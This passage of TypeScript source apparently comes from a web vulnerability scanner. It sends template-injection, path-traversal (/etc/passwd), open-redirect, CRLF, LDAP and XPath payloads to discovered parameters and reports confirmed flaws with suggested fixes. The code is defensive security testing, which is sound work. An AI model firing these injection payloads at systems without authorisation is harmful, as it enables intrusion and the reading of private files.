              demonstration: `We placed ${payload} in the "${param}" ${sent.reqMethod} parameter on ${endpointPath} and the server echoed it back unescaped — an attacker-supplied script in this parameter would run in a visitor's browser.`,
            }),
          });
          return; // confirmed for this param
        }
      } catch { /* probe failed */ }
    }
  };

  // --- AGGRESSIVE-tier per-parameter probes (opt-in) ---
  const PASSWD_SIG = /root:[^:\n]*:0:0:/;
  const REDIRECT_MARKER = "seclayer-openredirect-probe.example";

  // SSTI: arithmetic oracle. The product only appears if the engine evaluated
  // our expression; the literal payload never contains it.
  const trySsti = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    const key = `ssti:${endpointPath}:${param}`;
    if (reported.has(key)) return;
    const a = 1000 + crypto.randomInt(8999), b = 1000 + crypto.randomInt(8999);
    const product = String(a * b);
    for (const expr of [`{{${a}*${b}}}`, `\${${a}*${b}}`, `#{${a}*${b}}`, `<%= ${a}*${b} %>`]) {
      if (!canSpend()) return;
      budget--;
      try {
        const sent = await sendInjection(t, param, expr);
        const idx = sent.text.indexOf(product);
        if (idx !== -1 && !sent.text.includes(expr)) {
          reported.add(key);
          findings.push({
            testName: `Server-Side Template Injection (discovered parameter "${param}" on ${endpointPath})`,
            payload: `${param}=${expr}`,
            severity: "critical",
            description: `The discovered ${sent.reqMethod} parameter "${param}" on ${endpointPath} is evaluated by a server-side template engine: injecting "${expr}" returned its computed result. SSTI frequently escalates to remote code execution.`,
            fix: "Never render user input as a template. Pass untrusted values only as data to a pre-compiled/sandboxed template for this parameter.",
            evidence: buildProbeEvidence({
              method: "oracle", attackUrl: sent.attackUrl, requestHeaders: sessionHeaders(), res: sent.res, body: sent.text,
              matchIndex: idx, quote: product,
              reqMethod: sent.reqMethod, reqBody: sent.reqBody, reqContentType: sent.reqContentType,
              why: `We injected the template expression "${expr}"; the response contained ${product}, the exact product of ${a}×${b}, which the literal payload never contains — so the "${param}" value was evaluated as a template.`,
              demonstration: `We placed "${expr}" in the "${param}" ${sent.reqMethod} parameter on ${endpointPath} and the server rendered ${product} — proof the backend evaluated our expression (SSTI).`,
            }),
          });
          return;
        }
      } catch { /* probe failed */ }
    }
  };

  // Path traversal / LFI: retrieve /etc/passwd via a discovered parameter.
  const tryLfi = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    const key = `lfi:${endpointPath}:${param}`;
    if (reported.has(key)) return;
    for (const payload of ["../../../../../../../../etc/passwd", "....//....//....//....//....//etc/passwd", "/etc/passwd"]) {
      if (!canSpend()) return;
      budget--;
      try {
        const sent = await sendInjection(t, param, payload);
        const m = PASSWD_SIG.exec(sent.text);
        if (m) {
          // Differential guard, the same one the SQLi check above applies and
          // this one was missing: confirm a benign value for this parameter
          // doesn't already return the passwd line. Pages that quote
          // /etc/passwd as text — security tutorials, runbooks, log viewers —
          // match this signature while proving nothing, and this check
          // reported five CRITICAL findings against a target whose
          // documentation contains it. Only runs on a match, so the request
          // budget is unaffected on a clean scan.
          budget--;
          const baseText = await sendInjection(t, param, "index").then((r) => r.text).catch(() => "");
          if (PASSWD_SIG.test(baseText)) return; // inherent page content → not a finding
          reported.add(key);
          findings.push({
            testName: `Path Traversal / Local File Inclusion (discovered parameter "${param}" on ${endpointPath})`,
            payload: `${param}=${payload}`,
            severity: "critical",
            description: `The discovered ${sent.reqMethod} parameter "${param}" on ${endpointPath} reads an attacker-supplied filesystem path: a traversal payload returned the contents of /etc/passwd. An attacker can read arbitrary files the app can access.`,
            fix: "Resolve the path and confirm it stays within an allowed base directory (canonicalize then prefix-check), or map inputs to an allow-list; reject path separators/traversal for this parameter.",
            evidence: buildProbeEvidence({
              method: "error-signature", attackUrl: sent.attackUrl, requestHeaders: sessionHeaders(), res: sent.res, body: sent.text,
              matchIndex: m.index, quote: m[0],
              reqMethod: sent.reqMethod, reqBody: sent.reqBody, reqContentType: sent.reqContentType,
              why: `This "root" line from /etc/passwd is outside the web root. A benign value for "${param}" returns a response WITHOUT it, so it only appears because our traversal payload reached the filesystem.`,
              demonstration: `We requested "${payload}" via the "${param}" ${sent.reqMethod} parameter on ${endpointPath} and the server returned /etc/passwd contents ("${m[0]}") — arbitrary file read.`,
            }),
          });
          return;
        }
      } catch { /* probe failed */ }
    }
  };

  // Open redirect: a discovered parameter used as an unvalidated redirect target.
  // GET-only: the proof is a 3xx Location header, which the raw GET probe
  // captures; a form POST rarely drives an offsite redirect via a body field.
  const tryOpenRedirect = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    if (t.method !== "GET") return;
    const key = `redirect:${endpointPath}:${param}`;
    if (reported.has(key)) return;
    for (const payload of [`https://${REDIRECT_MARKER}/`, `//${REDIRECT_MARKER}/`]) {
      if (!canSpend()) return;
      budget--;
      try {
        const attackUrl = buildUrl(t.url, param, payload);
        const res = await probeRaw(attackUrl);
        const location = res.headers.get("location") || "";
        let offsite = false;
        if (res.status >= 300 && res.status < 400 && location) {
          try { offsite = new URL(location, t.url).host === REDIRECT_MARKER; } catch { offsite = location.includes(REDIRECT_MARKER); }
        }
        if (offsite) {
          reported.add(key);
          findings.push({
            testName: `Open Redirect (discovered parameter "${param}" on ${endpointPath})`,
            payload: `${param}=${payload}`,
            severity: "medium",
            description: `The discovered parameter "${param}" on ${endpointPath} is an unvalidated redirect target: the app issued an HTTP redirect to an attacker-controlled external host. Used for phishing and OAuth token theft.`,
            fix: "Redirect only to an allow-list of paths/hosts, or force a relative path; reject absolute/protocol-relative targets that aren't your origin.",
            evidence: buildHeaderEvidence({
              method: "reflection", reqMethod: "GET", attackUrl, requestHeaders: sessionHeaders(), res,
              proofHeaders: [`Location: ${location}`], quote: REDIRECT_MARKER,
              why: `The server answered with an HTTP ${res.status} redirect whose Location points at "${REDIRECT_MARKER}", supplied via "${param}".`,
              demonstration: `We set "${param}" to "${payload}" on ${endpointPath} and the server redirected to ${location} — an external host we control.`,
            }),
          });
          return;
        }
      } catch { /* probe failed */ }
    }
  };

  // CRLF / response-header injection via a discovered parameter. The %0d%0a must
  // stay percent-encoded in the URL, so this builds the query manually (buildUrl
  // would re-encode the '%'). GET-only: the proof is an injected response header,
  // captured by the raw GET probe.
  const tryCrlf = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    if (t.method !== "GET") return;
    const key = `crlf:${endpointPath}:${param}`;
    if (reported.has(key)) return;
    const marker = `x-seclayer-crlf-${crypto.randomBytes(4).toString("hex")}`;
    let base: string;
    try {
      const u = new URL(t.url);
      u.searchParams.delete(param);
      base = u.toString();
    } catch { return; }
    for (const seq of [`probe%0d%0a${marker}%3a%20injected`, `probe%0a${marker}%3a%20injected`]) {
      if (!canSpend()) return;
      budget--;
      try {
        const attackUrl = `${base}${base.includes("?") ? "&" : "?"}${param}=${seq}`;
        const res = await probeRaw(attackUrl);
        if (res.headers.has(marker)) {
          reported.add(key);
          findings.push({
            testName: `CRLF / HTTP Response Header Injection (discovered parameter "${param}" on ${endpointPath})`,
            payload: `${param}=probe\\r\\n${marker}: injected`,
            severity: "high",
            description: `The discovered parameter "${param}" on ${endpointPath} is written into a response header unsanitized: an injected CRLF added an attacker-defined header. Enables response splitting, cookie injection, and cache poisoning.`,
            fix: "Strip CR/LF from any input that reaches a response header for this endpoint; use framework APIs that encode header values.",
            evidence: buildHeaderEvidence({
              method: "reflection", reqMethod: "GET", attackUrl, requestHeaders: sessionHeaders(), res,
              proofHeaders: [`${marker}: ${res.headers.get(marker)}`], quote: marker,
              why: `We injected an encoded newline plus "${marker}" into "${param}" and the server emitted "${marker}" as a real response header.`,
              demonstration: `A CRLF sequence in the "${param}" parameter on ${endpointPath} made the server add our own header "${marker}" to its response.`,
            }),
          });
          return;
        }
      } catch { /* probe failed */ }
    }
  };

  // Fetch a POST form's own page once (cached per page) to establish a session:
  // the cookie it sets and the hidden anti-CSRF token it embeds, both needed for
  // the fuzz POSTs to be accepted rather than 403'd. GET/query targets and forms
  // with neither a cookie nor a token yield {}, so the request shape is unchanged.
  const sessionCache = new Map<string, FormSession>();
  const prepFormSession = async (t: InjectableTarget): Promise<FormSession> => {
    if (t.method !== "POST" || t.source !== "form") return {};
    const pageUrl = t.discoveredOnPage || t.url;
    const cached = sessionCache.get(pageUrl);
    if (cached) return cached;
    let sess: FormSession = {};
    if (canSpend()) {
      budget--;
      const ctl = new AbortController();
      const id = setTimeout(() => ctl.abort(), 4000);
      try {
        const res = await safeFetch(pageUrl, { headers: fuzzHeaders, signal: ctl.signal });
        const html = await res.text().catch(() => "");
        const setCookie: string[] =
          typeof (res.headers as any).getSetCookie === "function" ? (res.headers as any).getSetCookie() : [];
        const cookie = setCookie.map((c) => c.split(";")[0].trim()).filter(Boolean).join("; ") || undefined;
        const token = extractHiddenToken(html);
        sess = { cookie, tokenName: token?.name, tokenValue: token?.value };
      } catch { /* leave session empty — degrade to unauthenticated fuzzing */ }
      finally { clearTimeout(id); }
    }
    sessionCache.set(pageUrl, sess);
    return sess;
  };

  // LDAP injection (error-based). Inject an unbalanced LDAP filter metacharacter
  // and confirm ONLY when the response carries a distinctive LDAP filter-syntax
  // error that a benign value for the same parameter does not — the same
  // differential guard the SQLi error probe uses, so an LDAP error already in
  // the page (docs, an unrelated stack trace) is not mistaken for injection.
  const tryLdap = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    const key = `ldap:${endpointPath}:${param}`;
    if (reported.has(key)) return;
    for (const breaker of ["*)(&", ")(|(", "*)(uid=*))(|(uid=*", "*))%00"]) {
      if (!canSpend()) return;
      budget--;
      try {
        const sent = await sendInjection(t, param, breaker);
        const m = ldapErrorSig.exec(sent.text);
        if (m) {
          budget--;
          const baseText = await sendInjection(t, param, "seclayer1").then((s) => s.text).catch(() => "");
          if (ldapErrorSig.test(baseText)) return; // inherent error → not a finding
          reported.add(key);
          findings.push({
            testName: `LDAP Injection (discovered parameter "${param}" on ${endpointPath})`,
            payload: `${param}=${breaker}`,
            severity: "critical",
            description: `Injecting LDAP filter metacharacters into the discovered ${sent.reqMethod} parameter "${param}" on ${endpointPath} provoked an LDAP filter-syntax error, indicating the value is concatenated into an LDAP query unescaped — exploitable for authentication bypass and directory data disclosure.`,
            fix: "Escape LDAP special characters per RFC 4515 (or use a parameterized LDAP API) for this parameter; never build a search filter by string concatenation of request input.",
            evidence: buildProbeEvidence({
              method: "error-signature", attackUrl: sent.attackUrl, requestHeaders: sessionHeaders(), res: sent.res, body: sent.text,
              matchIndex: m.index, quote: m[0],
              reqMethod: sent.reqMethod, reqBody: sent.reqBody, reqContentType: sent.reqContentType,
              why: `This raw LDAP error is emitted only when the injected metacharacter breaks the LDAP filter's syntax, proving the "${param}" value reaches the directory query unescaped. A benign value for the same parameter returns no such error.`,
              demonstration: `We injected ${breaker} into the "${param}" ${sent.reqMethod} parameter on ${endpointPath} and the server returned a raw LDAP filter error — proof this parameter is concatenated into an LDAP query unescaped.`,
            }),
          });
          return;
        }
      } catch { /* probe failed */ }
    }
  };

  // XPath injection (error-based). Inject an unbalanced quote that breaks an
  // XPath string literal and confirm ONLY on a distinctive XPath-engine error
  // absent from the benign baseline. Runs independently of the SQLi quote probe:
  // the same "'" breaker may be tested by both, but each fires only on its own
  // engine's signature, so they never collide.
  const tryXpath = async (t: InjectableTarget, param: string, endpointPath: string): Promise<void> => {
    const key = `xpath:${endpointPath}:${param}`;
    if (reported.has(key)) return;
    for (const breaker of ["'", "\"", "']", "')"]) {
      if (!canSpend()) return;
      budget--;
      try {
        const sent = await sendInjection(t, param, breaker);
        const m = xpathErrorSig.exec(sent.text);
        if (m) {
          budget--;
          const baseText = await sendInjection(t, param, "seclayer1").then((s) => s.text).catch(() => "");
          if (xpathErrorSig.test(baseText)) return; // inherent error → not a finding
          reported.add(key);
          findings.push({
            testName: `XPath Injection (discovered parameter "${param}" on ${endpointPath})`,
            payload: `${param}=${breaker}`,
            severity: "high",
            description: `Injecting an unbalanced quote into the discovered ${sent.reqMethod} parameter "${param}" on ${endpointPath} provoked an XPath expression error, indicating the value is concatenated into an XPath query unescaped — exploitable to bypass authentication and read arbitrary nodes of the backing XML document.`,
            fix: "Use parameterized/variable-bound XPath (pass untrusted values as variables, not string-concatenated), or strictly escape quotes and metacharacters for this parameter.",
            evidence: buildProbeEvidence({
              method: "error-signature", attackUrl: sent.attackUrl, requestHeaders: sessionHeaders(), res: sent.res, body: sent.text,
              matchIndex: m.index, quote: m[0],
              reqMethod: sent.reqMethod, reqBody: sent.reqBody, reqContentType: sent.reqContentType,
              why: `This raw XPath error is emitted only when the injected quote breaks the XPath expression's syntax, proving the "${param}" value reaches the XPath query unescaped. A benign value for the same parameter returns no such error.`,
              demonstration: `We injected ${breaker} into the "${param}" ${sent.reqMethod} parameter on ${endpointPath} and the server returned a raw XPath expression error — proof this parameter is concatenated into an XPath query unescaped.`,
            }),
          });
          return;
        }
      } catch { /* probe failed */ }
    }
  };

  for (const t of targets) {
    if (!canSpend()) break;
    let endpointPath = t.url;
    try { endpointPath = new URL(t.url).pathname; } catch {}
    // Establish this target's session (carried cookie + CSRF token) before any
    // probe runs, so every injection this iteration submits is in-session.
    activeSession = await prepFormSession(t);
    // The slow time-based SQLi pass runs at most once per target (on its most
    // SQLi-leaning parameter), so it can't dominate the wall-clock budget.
    let timeTried = false;

    // Prioritize params by injectability, dedupe, cap per target.
    const ranked = [...new Set(t.params)]
      .map((p) => ({ p, s: classify(p) }))
      .sort((a, b) => Math.max(b.s.sqli, b.s.xss) - Math.max(a.s.sqli, a.s.xss))
      .slice(0, MAX_PARAMS_PER_TARGET);

    for (const { p: param, s } of ranked) {
      if (!canSpend()) break;
      paramsTested++;
      emit?.("probe", `→ Fuzzing "${param}" on ${endpointPath} — ${aggressive ? "SQLi/XSS/SSTI/LFI/redirect/CRLF/LDAP/XPath" : "SQLi/XSS"} payloads…`);
      const before = findings.length;
      // Run the higher-leaning class first so a tight budget hits likely wins.
      if (s.sqli >= s.xss) { await trySqli(t, param, endpointPath); await tryXss(t, param, endpointPath); }
      else { await tryXss(t, param, endpointPath); await trySqli(t, param, endpointPath); }

      // Aggressive tier: the four param-injection classes, on the same discovered
      // parameter. Endpoint/header classes (CORS, XXE, NoSQL) run at the root +
      // candidate-path level in server/aggressiveProbes.ts, not per-param.
      // trySsti/tryLfi run for GET and POST; open-redirect/CRLF are GET-only.
      if (aggressive) {
        await trySsti(t, param, endpointPath);
        await tryLfi(t, param, endpointPath);
        await tryOpenRedirect(t, param, endpointPath);
        await tryCrlf(t, param, endpointPath);
        await tryLdap(t, param, endpointPath);
        await tryXpath(t, param, endpointPath);
        // Blind SQLi (time-based + boolean-based): only when error-based SQLi
        // didn't already fire for this param, once per target, on a SQLi-leaning
        // parameter — catches injection on apps that suppress errors and reflect
        // nothing. Time-based catches apps that will sleep; boolean-based catches
        // apps that won't but whose page content tracks a SQL condition.
        if (!timeTried && s.sqli >= s.xss) {
          timeTried = true;
          await tryTimeSqli(t, param, endpointPath);
          await tryBooleanSqli(t, param, endpointPath);
        }
      }
      // Report any injections confirmed on this parameter to the live ticker.
      for (let i = before; i < findings.length; i++) {
        emit?.("result", `✓ CONFIRMED: ${findings[i].testName} [${String(findings[i].severity || "").toUpperCase()}] — payload: ${findings[i].payload}`);
      }
    }
  }

  return { findings, paramsTested, captures };
}
